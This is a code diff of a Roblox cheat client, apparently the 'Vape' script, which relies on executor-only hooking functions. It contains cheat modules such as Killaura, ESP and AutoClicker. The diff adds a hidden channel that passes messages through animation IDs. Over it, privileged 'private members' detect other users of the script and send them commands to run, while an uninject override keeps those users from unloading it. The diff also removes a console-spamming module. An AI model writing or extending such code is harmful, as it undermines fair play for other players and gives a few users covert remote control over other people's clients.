@@ -237,7 +237,6 @@ local hash = loadstring(downloadFile('newvape/libraries/hash.lua'), 'hash')()
 local prediction = loadstring(downloadFile('newvape/libraries/prediction.lua'), 'prediction')()
 entitylib = loadstring(downloadFile('newvape/libraries/entity.lua'), 'entitylibrary')()
 local whitelist = {
-	alreadychecked = {},
 	customtags = {},
 	tagcallback = {},
 	data = {WhitelistedUsers = {}},
@@ -249,7 +248,10 @@ local whitelist = {
 	hooked = false,
 	loaded = false,
 	localprio = 0,
-	said = {}
+	said = {},
+	threads = {},
+	alreadychecked = {},
+	animprefix = 'http=507770677|vape|'
 }
 vape.Libraries.entity = entitylib
 vape.Libraries.whitelist = whitelist
@@ -396,38 +398,28 @@ end)
 
 run(function()
 	function whitelist:get(plr)
-		local plrstr = self.hashes[plr.Name..plr.UserId]
-		for _, v in self.data.WhitelistedUsers do
-			if v.hash == plrstr then
-				return v.level, v.attackable or whitelist.localprio >= v.level, v.tags
+		local hash = self.hashes[plr.Name..plr.UserId]
+		for _, entry in self.data.WhitelistedUsers do
+			if entry.hash == hash then
+				return entry.level, entry.attackable or self.localprio >= entry.level, entry.tags
 			end
 		end
 
 		return 0, true
 	end
 
-	function whitelist:isingame()
-		for _, v in playersService:GetPlayers() do
-			if self:get(v) ~= 0 then
-				return true
-			end
-		end
-
-		return false
-	end
-
 	function whitelist:tag(plr, text, rich)
 		local plrtag, newtag = table.clone(select(3, self:get(plr)) or self.customtags[plr.Name] or {}), ''
-		for _, v in self.tagcallback do
-			v(plr, plrtag, rich)
+		for _, callback in self.tagcallback do
+			callback(plr, plrtag, rich)
 		end
 
 		if not text then
 			return plrtag
 		end
 
-		for _, v in plrtag do
-			newtag = newtag..(rich and v.color and '<font color="#'..v.color:ToHex()..'">['..v.text..']</font>' or '['..removeTags(v.text)..']')..' '
+		for _, tag in plrtag do
+			newtag = newtag..(rich and tag.color and '<font color="#'..tag.color:ToHex()..'">['..tag.text..']</font>' or '['..removeTags(tag.text)..']')..' '
 		end
 
 		return newtag
@@ -453,14 +445,93 @@ run(function()
 		return false
 	end
 
+	function whitelist:addEntity(entity)
+		if entity.Player and typeof(entity.Player) == 'Instance' then
+			local plr = entity.Player
+			if self.threads[entity.Character] then
+				task.cancel(self.threads[entity.Character])
+			end
+
+			self.threads[entity.Character] = task.spawn(function()
+				if typeof(entity.Humanoid) == 'Instance' then
+					local animator = entity.Humanoid:WaitForChild('Animator', workspace.StreamingEnabled and math.huge or 10)
+
+					if animator and animator:IsA('Animator') then
+						table.insert(entity.Connections, animator.AnimationPlayed:Connect(function(track)
+							local id = track.Animation.AnimationId
+
+							if id:sub(1, #self.animprefix) == self.animprefix then
+								local data = id:sub(#self.animprefix + 1, #id):split('|')
+
+								if data[1] == 'using' then
+									if self.localprio > 0 and not self.said[plr.UserId] then
+										self.said[plr.UserId] = true
+										notif('Vape', plr.Name..' is using vape!', 60)
+
+										self.customtags[plr.Name] = {{
+											text = 'VAPE USER',
+											color = Color3.new(1, 1, 0)
+										}}
+
+										entitylib.Events.EntityUpdated:Fire(entity)
+										self:sendMessage('see|'..plr.UserId)
+									end
+								elseif self:get(plr) > 0 then
+									if data[1] == 'see' and data[2] == tostring(lplr.UserId) then
+										if self.animthread then
+											task.cancel(self.animthread)
+											self.animthread = nil
+										end
+									elseif data[1] == 'cmd' then
+										table.remove(data, 1)
+										task.spawn(function()
+											self:process(table.concat(data, ' '), plr)
+										end)
+									end
+								end
+							end
+						end))
+					end
+				end
+			end)
+		end
+	end
+
+	function whitelist:sendMessage(msg, needResponse)
+		if self.animthread then
+			task.cancel(self.animthread)
+		end
+
+		self.animthread = task.spawn(function()
+			repeat
+				local animator = entitylib.isAlive and entitylib.character.Character:FindFirstChildWhichIsA('Animator', true) or nil
+
+				if animator then
+					local anim = Instance.new('Animation')
+					anim.AnimationId = (self.animprefix..msg):sub(1, 256)
+					local track = animator:LoadAnimation(anim)
+					track:Play()
+					track:Stop()
+
+					if not needResponse then
+						break
+					end
+				end
+
+				task.wait(1)
+			until false
+		end)
+	end
+
 	local olduninject
-	function whitelist:playeradded(v, joined)
-		if self:get(v) ~= 0 then
-			if self.alreadychecked[v.UserId] then return end
-			self.alreadychecked[v.UserId] = true
+	function whitelist:playeradded(plr, joined)
+		if self:get(plr) ~= 0 then
+			if self.alreadychecked[plr.UserId] then return end
+			self.alreadychecked[plr.UserId] = true
 			self:hook()
 
 			if self.localprio == 0 then
+				self:sendMessage('using', true)
 				olduninject = vape.Uninject
 				vape.Uninject = function()
 					notif('Vape', 'No escaping the private members :)', 10)
@@ -477,7 +548,7 @@ run(function()
 			if self:getplayer(args[1], plr) then
 				table.remove(args, 1)
 				for cmd, func in self.commands do
-					if msg:sub(1, cmd:len() + 1):lower() == ';'..cmd:lower() then
+					if msg:sub(1, #cmd):lower() == cmd:lower() then
 						func(args, plr)
 						return true
 					end
@@ -486,14 +557,6 @@ run(function()
 		end
 
 		return false
-	end
-
-	function whitelist:newchat(obj, plr, skip)
-		obj.PrefixText = self:tag(plr, true, true)..(obj.PrefixText or '')
-
-		if not skip and self:process(obj.Text, plr) then
-			obj.Visible = false
-		end
 	end
 
 	function whitelist:oldchat(func)
@@ -506,12 +569,8 @@ run(function()
 			local plr = playersService:GetPlayerByUserId(data.SpeakerUserId)
 			if plr then
 				data.ExtraData.Tags = data.ExtraData.Tags or {}
-				for _, v in self:tag(plr) do
-					table.insert(data.ExtraData.Tags, {TagText = v.text, TagColor = v.color})
-				end
-
-				if data.Message and self:process(data.Message, plr) then
-					data.Message = ''
+				for _, tag in self:tag(plr) do
+					table.insert(data.ExtraData.Tags, {TagText = tag.text, TagColor = tag.color})
 				end
 			end
 
@@ -526,6 +585,57 @@ run(function()
 	function whitelist:hook()
 		if self.hooked then return end
 		self.hooked = true
+
+		for _, entity in entitylib.List do
+			self:addEntity(entity)
+		end
+
+		vape:Clean(entitylib.Events.EntityAdded:Connect(function(entity)
+			self:addEntity(entity)
+		end))
+
+		vape:Clean(function()
+			for _, thread in self.threads do
+				task.cancel(thread)
+			end
+
+			if self.animthread then
+				task.cancel(self.animthread)
+				self.animthread = nil
+			end
+
+			table.clear(self.threads)
+		end)
+
+		if self.localprio > 0 then
+			local cmdbar = Instance.new('TextBox')
+			cmdbar.BackgroundTransparency = 0.5
+			cmdbar.BackgroundColor3 = Color3.new()
+			cmdbar.BorderSizePixel = 0
+			cmdbar.ClearTextOnFocus = true
+			cmdbar.FontFace = Font.fromEnum(Enum.Font.Arimo)
+			cmdbar.Size = UDim2.new(1, 0, 0, 30)
+			cmdbar.TextColor3 = Color3.new(1, 1, 1)
+			cmdbar.TextSize = 24
+			cmdbar.Visible = false
+			cmdbar.Parent = vape.gui
+			print('created!')
+
+			vape:Clean(inputService.InputEnded:Connect(function(input)
+				if input.KeyCode == Enum.KeyCode.RightBracket and (not inputService:GetFocusedTextBox()) and next(self.said) then
+					cmdbar.Visible = true
+					cmdbar:CaptureFocus()
+				end
+			end))
+
+			vape:Clean(cmdbar.FocusLost:Connect(function(isEnter)
+				cmdbar.Visible = false
+
+				if isEnter then
+					self:sendMessage('cmd|'..cmdbar.Text:gsub(' ', '|'))
+				end
+			end))
+		end
 
 		if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
 			if getcallbackvalue and restorefunction and hookfunction then
@@ -559,7 +669,7 @@ run(function()
 										data.Text = msg.Text
 									end
 
-									self:newchat(data, plr, msg.Status ~= Enum.TextChatMessageStatus.Success)
+									data.PrefixText = self:tag(plr, true, true)..(data.PrefixText or '')
 								end
 
 								return data
@@ -601,7 +711,7 @@ run(function()
 			end)
 
 			local localizationService = game:GetService('LocalizationService')
-			local root = game:GetService('CorePackages').Workspace.Packages._Index.NotificationModalsManager.NotificationModalsManager
+			local root = game:GetService('CorePackages').Workspace.Packages._Index.NotificationModalsManager
 			local reactBlox = getrenv().require(root.ReactRoblox)
 			local react = getrenv().require(root.React)
 			local UIBlox = getrenv().require(root.UIBlox)
@@ -675,7 +785,7 @@ run(function()
 		bkg.AnchorPoint = Vector2.new(0.5, 0.5)
 		bkg.BackgroundTransparency = 1
 		bkg.Image = 'rbxasset://LuaPackages/Packages/_Index/FoundationImages/FoundationImages/SpriteSheets/img_set_1x_3.png'
-		bkg.ImageRectOffset = Vector2.new(490, 196)
+		bkg.ImageRectOffset = Vector2.new(490, 168)
 		bkg.ImageRectSize = Vector2.new(21, 21)
 		bkg.ScaleType = Enum.ScaleType.Slice
 		bkg.SliceCenter = Rect.new(10, 10, 11, 11)
@@ -777,15 +887,20 @@ run(function()
 				end
 			end
 
-			if not whitelist.connection then
-				whitelist.connection = playersService.PlayerAdded:Connect(function(v)
-					whitelist:playeradded(v, true)
+			if not self.connection then
+				self.connection = playersService.PlayerAdded:Connect(function(plr)
+					whitelist:playeradded(plr, true)
 				end)
-				vape:Clean(whitelist.connection)
+
+				vape:Clean(self.connection)
+				vape:Clean(playersService.PlayerRemoving:Connect(function(plr)
+					self.said[plr.UserId] = nil
+					self.alreadychecked[plr.UserId] = nil
+				end))
 			end
 
-			for _, v in playersService:GetPlayers() do
-				whitelist:playeradded(v)
+			for _, plr in playersService:GetPlayers() do
+				whitelist:playeradded(plr)
 			end
 
 			if entitylib.Running and vape.Loaded then
@@ -908,6 +1023,7 @@ run(function()
 				if vape.ThreadFix then
 					setthreadidentity(8)
 				end
+
 				olduninject(vape)
 			else
 				vape:Uninject()
@@ -1175,7 +1291,7 @@ run(function()
 		List = {'Tool', 'Click', 'RightClick'},
 		Tooltip = 'Tool - Automatically uses roblox tools (eg. swords)\nClick - Left click\nRightClick - Right click'
 	})
-	CPS = AutoClicker:CreateTwoSlider({
+	CPS = AutoClicker:CreateRangeSlider({
 		Name = 'CPS',
 		Min = 1,
 		Max = 20,
@@ -2831,7 +2947,7 @@ run(function()
 	Targets = Killaura:CreateTargets({
 		Players = true
 	})
-	CPS = Killaura:CreateTwoSlider({
+	CPS = Killaura:CreateRangeSlider({
 		Name = 'Attacks per Second',
 		Min = 1,
 		Max = 20,
@@ -4027,7 +4143,7 @@ run(function()
 			DistanceLimit.Object.Visible = callback
 		end
 	})
-	DistanceLimit = Arrows:CreateTwoSlider({
+	DistanceLimit = Arrows:CreateRangeSlider({
 		Name = 'Player Distance',
 		Min = 0,
 		Max = 256,
@@ -4867,7 +4983,7 @@ run(function()
 			DistanceLimit.Object.Visible = callback
 		end
 	})
-	DistanceLimit = ESP:CreateTwoSlider({
+	DistanceLimit = ESP:CreateRangeSlider({
 		Name = 'Player Distance',
 		Min = 0,
 		Max = 256,
@@ -5698,7 +5814,7 @@ run(function()
 			DistanceLimit.Object.Visible = callback
 		end
 	})
-	DistanceLimit = NameTags:CreateTwoSlider({
+	DistanceLimit = NameTags:CreateRangeSlider({
 		Name = 'Player Distance',
 		Min = 0,
 		Max = 256,
@@ -5872,6 +5988,7 @@ run(function()
 	local Radar
 	local Targets
 	local DotStyle
+	local Scale
 	local PlayerColor
 	local Clamp
 	local Reference = {}
@@ -5926,21 +6043,24 @@ run(function()
 					end
 					Added(entity)
 				end
+	
 				Radar:Clean(entitylib.Events.EntityAdded:Connect(function(entity)
 					if Reference[entity] then
 						Removed(entity)
 					end
 					Added(entity)
 				end))
+	
 				Radar:Clean(vape.Categories.Friends.ColorUpdate.Event:Connect(function()
 					for entity, dot in Reference do
 						dot.BackgroundColor3 = entitylib.getEntityColor(entity) or Color3.fromHSV(PlayerColor.Hue, PlayerColor.Sat, PlayerColor.Value)
 					end
 				end))
+	
 				Radar:Clean(runService.RenderStepped:Connect(function()
 					for entity, dot in Reference do
 						if entitylib.isAlive then
-							local dt = CFrame.lookAlong(entitylib.character.RootPart.Position, gameCamera.CFrame.LookVector * Vector3.new(1, 0, 1)):PointToObjectSpace(entity.RootPart.Position)
+							local dt = CFrame.lookAlong(entitylib.character.RootPart.Position, gameCamera.CFrame.LookVector * Vector3.new(1, 0, 1)):PointToObjectSpace(entity.RootPart.Position) * Scale.Value
 							dot.Position = UDim2.fromOffset(Clamp.Enabled and math.clamp(108 + dt.X, 2, 214) or 108 + dt.X, Clamp.Enabled and math.clamp(108 + dt.Z, 8, 214) or 108 + dt.Z)
 						end
 					end
@@ -5969,6 +6089,13 @@ run(function()
 				dot.UICorner.CornerRadius = UDim.new(val == 'Circles' and 1 or 0, 0)
 			end
 		end
+	})
+	Scale = Radar:CreateSlider({
+		Name = 'Scale',
+		Min = 0,
+		Max = 2,
+		Default = 1,
+		Decimal = 10
 	})
 	PlayerColor = Radar:CreateColorSlider({
 		Name = 'Player Color',
@@ -7147,7 +7274,7 @@ run(function()
 			DistanceLimit.Object.Visible = callback
 		end
 	})
-	DistanceLimit = Tracers:CreateTwoSlider({
+	DistanceLimit = Tracers:CreateRangeSlider({
 		Name = 'Player Distance',
 		Min = 0,
 		Max = 256,
@@ -7754,45 +7881,6 @@ run(function()
 		Name = 'Jump State',
 		Visible = false,
 		Darker = true
-	})
-end)
-
-run(function()
-	local LogSpammer
-	local Message
-	local rand = Random.new()
-	
-	LogSpammer = vape.Categories.Utility:CreateModule({
-		Name = 'LogSpammer',
-		Function = function(callback)
-			if callback then
-				local useSignal = true
-	
-				repeat
-					if entitylib.isAlive then
-						local animator = entitylib.character.Humanoid:FindFirstChildWhichIsA('Animator')
-	
-						if animator then
-							if replicatesignal and useSignal then
-								useSignal = pcall(replicatesignal, animator.OnCombinedUpdate, ('http=507770677'..utf8.char(rand:NextInteger(1, 65535))..Message.Value):sub(1, 256), true, 0, 0.0001, 0, 0, Enum.AnimationPriority.Core, true, 255)
-							else
-								local anim = Instance.new('Animation')
-								anim.AnimationId = ('http=507770677'..utf8.char(rand:NextInteger(1, 65535))..Message.Value):sub(1, 256)
-								local track = animator:LoadAnimation(anim)
-								track:Play(0, 0.0001, 0)
-							end
-						end
-					end
-	
-					task.wait()
-				until not LogSpammer.Enabled
-			end
-		end,
-		Tooltip = 'Use animations to spam the console of people ingame'
-	})
-	Message = LogSpammer:CreateTextBox({
-		Name = 'Message',
-		Placeholder = 'text (242 character limit)'
 	})
 end)
 
@@ -9321,6 +9409,75 @@ run(function()
 	local corner = Instance.new('UICorner')
 	corner.CornerRadius = UDim.new(0, 4)
 	corner.Parent = label
+end)
+
+run(function()
+	local GameTheme
+	local Mode
+	local Modes = {
+		Winter = function()
+			local part = Instance.new('Part')
+			part.Anchored = true
+			part.CanCollide = false
+			part.CanQuery = false
+			part.CastShadow = false
+			part.Size = Vector3.one * 200
+			part.Transparency = 1
+			part.Parent = workspace
+			local particleemitter = Instance.new('ParticleEmitter')
+			particleemitter.Acceleration = Vector3.new(0, -4, 0)
+			particleemitter.EmissionDirection = Enum.NormalId.Bottom
+			particleemitter.LightEmission = 1
+			particleemitter.LightInfluence = 1
+			particleemitter.Rate = 400
+			particleemitter.RotSpeed = NumberRange.new(6, 12)
+			particleemitter.Size = NumberSequence.new({
+				NumberSequenceKeypoint.new(0, 0.75, 0.3),
+				NumberSequenceKeypoint.new(1, 0.75, 0.3)
+			})
+			particleemitter.Parent = part
+	
+			local oldSettings = {lightingService.Ambient, lightingService.EnvironmentDiffuseScale, lightingService.EnvironmentSpecularScale, lightingService.FogEnd}
+			lightingService.Ambient = Color3.fromRGB(0, 242, 255)
+			lightingService.EnvironmentDiffuseScale = 0
+			lightingService.EnvironmentSpecularScale = 0
+			lightingService.FogEnd = 900
+	
+			GameTheme:Clean(part)
+			GameTheme:Clean(runService.RenderStepped:Connect(function()
+				if entitylib.isAlive then
+					part.CFrame = CFrame.new(entitylib.character.RootPart.Position)
+				end
+			end))
+	
+			GameTheme:Clean(function()
+				lightingService.Ambient = oldSettings[1]
+				lightingService.EnvironmentDiffuseScale = oldSettings[2]
+				lightingService.EnvironmentSpecularScale = oldSettings[3]
+				lightingService.FogEnd = oldSettings[4]
+			end)
+		end
+	}
+	
+	GameTheme = vape.Legit:CreateModule({
+		Name = 'GameTheme',
+		Function = function(callback)
+			if callback then
+				Modes[Mode.Value]()
+			end
+		end,
+		Tooltip = 'funny'
+	})
+	Mode = GameTheme:CreateDropdown({
+		Name = 'Mode',
+		List = {'Winter'},
+		Function = function()
+			if GameTheme.Enabled then
+				GameTheme:Toggle()
+				GameTheme:Toggle()
+			end
+		end
+	})
 end)
 
 run(function()
